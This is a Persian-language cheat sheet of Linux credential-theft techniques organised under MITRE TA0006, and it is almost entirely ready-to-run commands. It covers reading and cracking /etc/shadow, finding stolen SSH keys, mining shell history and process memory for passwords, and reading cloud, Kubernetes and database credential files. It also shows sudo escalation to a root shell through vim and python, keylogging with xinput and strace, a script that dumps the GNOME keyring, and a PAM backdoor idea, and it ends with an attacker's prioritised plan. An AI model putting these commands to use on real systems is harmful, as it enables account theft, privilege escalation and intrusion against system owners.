
# Linux Credential Access (MITRE TA0006)

---

## ۱. /etc/passwd و /etc/shadow

```bash
# اگه دسترسی داری
cat /etc/shadow

# فرمت shadow
username:$6$salt$hash:...:...:...:...:...:...:
# $6$ = SHA-512 | $5$ = SHA-256 | $1$ = MD5
```

```bash
# Crack با hashcat
hashcat -m 1800 shadow.txt rockyou.txt        # SHA-512
hashcat -m 500  shadow.txt rockyou.txt        # MD5-crypt

# یا john
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=rockyou.txt combined.txt
```

---

## ۲. SSH Keys

```bash
# یافتن private keyها
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# معمولاً اینجان
~/.ssh/id_rsa
~/.ssh/config          # ← مهم: اطلاعات هاست‌ها

# استفاده مستقیم
ssh -i stolen_key user@target
```

---

## ۳. Bash History

```bash
cat ~/.bash_history
cat ~/.zsh_history

# دنبال پسورد توی تاریخچه
grep -i "pass\|pwd\|secret\|token" ~/.bash_history

# نمونه واقعی که پیدا میشه
mysql -u root -pMySecret123
curl -u admin:password123 http://api/endpoint
sshpass -p 'hunter2' ssh user@server
```

---

## ۴. Memory Dumping

```bash
# پروسه‌های لو دهنده
ps aux | grep -E "ssh|sudo|mysql|postgres"

# dump حافظه یه پروسه خاص
gdb -p <PID>
(gdb) gcore /tmp/dump.core
strings /tmp/dump.core | grep -i "pass\|secret"

# یا با /proc مستقیم
cat /proc/<PID>/maps
dd if=/proc/<PID>/mem ... 
strings mem.dump | grep -iE "password|passwd|secret"
```

---

## ۵. Credential Files رایج

```bash
# فایل‌های config حاوی پسورد

# MySQL
cat ~/.my.cnf
cat /etc/mysql/my.cnf

# WordPress
cat /var/www/html/wp-config.php | grep -i "DB_PASS\|DB_USER"

# Laravel
cat /var/www/html/.env

# Git credentials
cat ~/.git-credentials
cat ~/.gitconfig

# AWS
cat ~/.aws/credentials

# Docker
cat ~/.docker/config.json

# Kubernetes
cat ~/.kube/config
```

---

## ۶. Sudo Abuse

```bash
# چی می‌تونیم با sudo اجرا کنیم
sudo -l

# نمونه خروجی خطرناک
(ALL) NOPASSWD: /usr/bin/vim
(ALL) NOPASSWD: /usr/bin/python3
(ALL) NOPASSWD: /usr/bin/find

# Escalate از vim
sudo vim -c ':!/bin/bash'

# از python
sudo python3 -c 'import os; os.system("/bin/bash")'
```

---

## ۷. Keylogging (بدون root)

```bash
# اگه X11 داری
which xinput
xinput list
xinput test <keyboard-id>

# یا با strace روی پروسه bash
strace -e trace=read -p <bash_PID> 2>&1 | grep -A2 "read(0"
```

---

## ۸. SUDO Token Reuse

```bash
# اگه sudo اخیراً اجرا شده → token هنوز valid
# (default: 15 دقیقه)

# بدون دانستن پسورد
sudo -n <command>

# یا inject کردن به session موجود
# با pam_tty_audit یا /proc/pts
```

---

## ۹. DBUS / Secret Service

```bash
# Gnome Keyring - پسورد ذخیره شده در GUI
secret-tool lookup <attribute> <value>

# یا dump مستقیم
python3 -c "
import secretstorage
conn = secretstorage.dbus_init()
col = secretstorage.get_default_collection(conn)
for item in col.get_all_items():
    print(item.get_label(), item.get_secret())
"
```

---

## ۱۰. PAM Backdoor (پیشرفته)

```bash
# اگه root داری → backdoor کردن pam برای capture
# فایل: /etc/pam.d/common-auth یا sshd

# اضافه کردن module مخرب که هر auth رو log می‌کنه
# (تکنیک Advanced Persistence)
```

---

## جمع‌بندی - اولویت‌بندی عملیاتی

۱. bash_history          ← سریع و پر بازده
۲. config files (.env)   ← اغلب cleartext
۳. /etc/shadow           ← اگه root داری
۴. SSH keys              ← برای lateral movement
۵. Memory dump           ← آخرین گزینه، نویزی


---

